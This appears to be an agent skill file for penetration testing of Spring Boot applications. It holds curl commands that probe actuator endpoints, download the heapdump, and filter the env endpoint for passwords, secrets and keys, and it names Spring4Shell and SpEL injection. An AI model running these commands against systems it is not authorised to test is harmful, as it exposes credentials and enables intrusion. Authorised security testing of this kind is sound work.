---
name: tech-spring
description: "Spring Framework security testing. Use when target uses Spring Boot/Spring MVC. Trigger keywords: spring, spring boot, actuator, jolokia, heapdump, env."
---

# Spring Framework Testing

## Actuator Endpoints
```bash
# Check exposed actuators
curl -s "https://target.com/actuator"
curl -s "https://target.com/actuator/health"
curl -s "https://target.com/actuator/env"
curl -s "https://target.com/actuator/heapdump"
```

## Common Vulnerabilities
- Actuator exposure (env, heapdump, logfile)
- Spring4Shell (CVE-2022-22965)
- SpEL injection
- Data binding abuse
- Broken access control on management endpoints

## Exploitation
```bash
# heapdump download
curl -s -O "https://target.com/actuator/heapdump"

# Env endpoint leaks
curl -s "https://target.com/actuator/env" | jq '.propertySources[].properties | to_entries[] | select(.key | contains("password") or contains("secret") or contains("key"))'
```

## Output
Log: exposed endpoints, leaked secrets, CVEs found.
